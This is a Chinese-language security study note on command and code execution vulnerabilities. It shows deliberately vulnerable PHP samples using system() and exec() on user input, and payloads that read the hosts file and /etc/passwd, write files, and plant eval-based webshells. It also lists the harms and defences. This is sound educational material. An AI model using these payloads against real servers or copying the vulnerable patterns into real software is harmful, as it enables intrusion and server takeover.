# 命令执行漏洞
## 漏洞原理
代码层过滤不严，应用程序直接或间接使用了动态执行命令的危险函数，并且这个函数的运行参数是可控的。</br>
涉及到的函数：system()、exec()、shell_exec()、passthru()、popen()、反引号

## 命令执行漏洞的利用
（1）system()函数典型代码，及利用</br>
system.php文件代码内容：
```php
<?php
if(isset($_GET[‘cmd’])){
         echo “<pre>”;
         system($_GET[‘cmd’]);
}
?>
```
利用方式：提交URL，并且构造想输入的命令到参数里面。</br>
URL：http://192.168.11.11/system.php?cmd=ipconfig</br>
（2）exec()函数典型代码及利用</br>
exec.php文件代码内容：</br>
```php
<?php
if(isset($_GET[‘cmd’])){
         echo “<pre>”;
         print exec($_GET[‘cmd’]);
}
?>
```
利用方式：提交URL，并且构造想输入的命令到参数里面。</br>
URL：http://192.168.11.11/exec.php?cmd=whoami</br>
（3）查看系统文件</br>
payload：
```
?cmd=type c:\windows\system32\drivers\etc\hosts      (查看系统hosts文件)
```
（4）写文件</br>
payload：
```
?cmd=echo “<?php phpinfo();?>” > c:\phpStudy\WWW\Command\shell.php
```
页面如果没有报错，说明写文件成功；再去访问shell.php文件，另外同样可以写入一句话木马。</br>
（5）其他命令执行的危险函数利用方式都差不多，均是利用参数过滤不严格，构造可控的命令内容到危险函数中去执行，最后达到攻击目的。</br>
（6）Windows和Linux中多命令执行的语法如下：</br>
![image](https://github.com/n4ttt/Sec-Note/assets/32692640/ee0ea053-5721-4d62-ba39-dc9e2d448c6a)

## 命令执行漏洞的危害
（1）继承web服务器程序权限（web用户权限），去执行系统命令</br>
（2）继承web服务器权限，读写文件</br>
（3）反弹shell</br>
（4）控制整个网站</br>
（5）控制整个服务器

## 命令执行漏洞的防御
（1）尽量少使用执行命令的函数或者禁用disable_functions；</br>
（2）在进入执行命令的函数之前，对参数进行过滤，对敏感字符进行转义；</br>
（3）参数值尽量使用引号包括，并且在拼接前调用addslashes进行转义。

# 代码执行漏洞
## 漏洞原理
应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。</br>
大部分都是根据源代码判断代码执行漏洞。</br>
代码执行相关危险函数：</br>
（1）PHP: eval、assert、preg_replace()、+/e模式（PHP版本<5.5.0）</br>
（2）Javascript: eval</br>
（3）Vbscript：Execute、Eval</br>
（4）Python: exec</br>
（5）Java: Java中没有php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。

## 代码执行漏洞的利用
（1）一句话木马
```
${@eval($_POST[1])}
```
（2）获取当前工作路径
```
${exit(print(getcwd()))}
```
使用菜刀
（3）读文件
```
${exit(var_dump(file_get_contents($_POST[f])))}
f=/etc/passwd
```
使用post提交数值 f=/etc/passwd
（4）写webshell
```
${exit(var_dump(file_put_contents($_POST[f], $_POST[d])))}
f=1.php&d=1111111
```
同样使用post

## 代码执行漏洞的防御
（1）对于eval()函数一定要保证用户不能轻易接触eval参数或者用正则严格判断输入的数据格式。</br>
（2）对于字符串一定要使用单引号包裹可控代码，并且插入前进行addslashes</br>
（3）对于preg_replace放弃使用e修饰符.如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹。
